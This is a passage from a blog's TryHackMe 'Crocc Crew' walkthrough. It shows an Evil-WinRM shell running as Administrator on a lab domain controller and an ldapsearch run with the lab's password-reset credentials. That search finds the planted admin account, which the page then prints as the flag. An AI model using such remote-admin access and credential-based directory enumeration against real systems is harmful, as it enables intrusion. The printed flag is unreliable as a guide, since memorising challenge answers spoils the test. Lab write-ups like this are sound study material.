+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd \
+*Evil-WinRM* PS C:\> dir
+
+
+    Directory: C:\
+
+
+Mode                LastWriteTime         Length Name
+<span class="flag">----</span>                <span class="flag">-------------</span>         <span class="flag">------</span> <span class="flag">----</span>
+d-----         6/7/2021   7:30 PM                Background
+d-----         6/7/2021   5:30 PM                inetpub
+d-----         6/7/2021  10:53 PM                PerfLogs
+d-r---         6/8/2021   3:44 PM                Program Files
+d-----         6/7/2021   5:25 PM                Program Files (x86)
+d-----         6/7/2021   8:05 PM                Shares
+d-r---         6/8/2021  11:54 AM                Users
+d-----         6/8/2021   3:50 PM                Windows
+
+
+*Evil-WinRM* PS C:\> cd Shares
+*Evil-WinRM* PS C:\Shares> ls
+
+
+    Directory: C:\Shares
+
+
+Mode                LastWriteTime         Length Name
+<span class="flag">----</span>                <span class="flag">-------------</span>         <span class="flag">------</span> <span class="flag">----</span>
+d-----         6/8/2021  12:42 PM                Home
+
+
+*Evil-WinRM* PS C:\Shares> cd Home
+*Evil-WinRM* PS C:\Shares\Home> ls
+
+
+    Directory: C:\Shares\Home
+
+
+Mode                LastWriteTime         Length Name
+<span class="flag">----</span>                <span class="flag">-------------</span>         <span class="flag">------</span> <span class="flag">----</span>
+<span class="flag">-a----</span>         6/8/2021  12:38 PM             28 priv-esc-2.txt
+<span class="flag">-a----</span>         6/7/2021   8:08 PM             22 priv-esc.txt
+<span class="flag">-a----</span>         6/7/2021   8:14 PM             17 user.txt
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<h3 id="finding-the-planted-account">Finding the Planted Account<a hidden class="anchor" aria-hidden="true" href="#finding-the-planted-account">#</a></h3>
+<p>The last task was to find the name of the account planted by the &ldquo;Crocc Crew.&rdquo; I figured this would be in an AD object&rsquo;s description somewhere. A simple <code>ldapsearch</code> and <code>grep</code> revealed the answer.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@crocccrew: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">ldapsearch</span> <span class="flag">-x</span> <span class="flag">-H</span> ldap://$target <span class="flag">-D</span> <span class="string">'COOCTUS\password-reset'</span> <span class="flag">-w</span> <span class="string">'resetpassword'</span> <span class="flag">-b</span> <span class="string">"dc=cooctus,dc=corp"</span>  | <span style="color: #15adff">grep</span> <span class="flag">-i</span> crocc
+member: CN=admCroccCrew,OU=Enterprise-Admins,OU=Security-OU,DC=COOCTUS,DC=CORP
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+
+<div class="ctf-flag-container">
+    <div class="flag-icon">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M4 4V20H6V15H14L13 13H20V4H4Z" fill="currentColor"/>
+        </svg>
+    </div>
+    <div class="flag-content">
+        
+admCroccCrew
+
+    </div>
+</div>
+
+<style>
+.ctf-flag-container {
+    display: flex;
+    align-items: center;
+    background-color: #2d3d1a;
+    color: #9fef00;
+    padding: 12px 16px;
+    border-radius: 6px;
+    margin: 16px 0;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    border: 1px solid #4a5d2a;
+}
+
+.flag-icon {
+    margin-right: 12px;
+    color: #9fef00;
+    flex-shrink: 0;
+}
+
+.flag-content {
+    flex: 1;
+    word-break: break-all;
+}
+
+.flag-content code {
+    background-color: transparent;
+    color: inherit;
+    padding: 0;
+    font-size: inherit;
+}
+</style>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://0xblivion.dev/tags/walkthrough/">Walkthrough</a></li>
+      <li><a href="https://0xblivion.dev/tags/writeup/">Writeup</a></li>
+      <li><a href="https://0xblivion.dev/tags/tryhackme/">Tryhackme</a></li>
+      <li><a href="https://0xblivion.dev/tags/windows/">Windows</a></li>
+      <li><a href="https://0xblivion.dev/tags/active-directory/">Active Directory</a></li>
+      <li><a href="https://0xblivion.dev/tags/rdp-enumeration/">RDP Enumeration</a></li>
+      <li><a href="https://0xblivion.dev/tags/rdp-sec-nla/">RDP Sec Nla</a></li>
+      <li><a href="https://0xblivion.dev/tags/constrained-delegation/">Constrained Delegation</a></li>
+      <li><a href="https://0xblivion.dev/tags/keberoasting/">Keberoasting</a></li>
+      <li><a href="https://0xblivion.dev/tags/ldapsearch/">Ldapsearch</a></li>
+      <li><a href="https://0xblivion.dev/tags/ldapdomaindump/">Ldapdomaindump</a></li>
+      <li><a href="https://0xblivion.dev/tags/allowedtodelagate/">AllowedToDelagate</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="https://0xblivion.dev/posts/thm/hard/tryhackme-ra-writeup/">
+    <span class="title">Next »</span>
+    <br>
+    <span>TryHackMe - Ra WriteUp</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://0xblivion.dev/">0xblivion.dev</a></span>
+
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
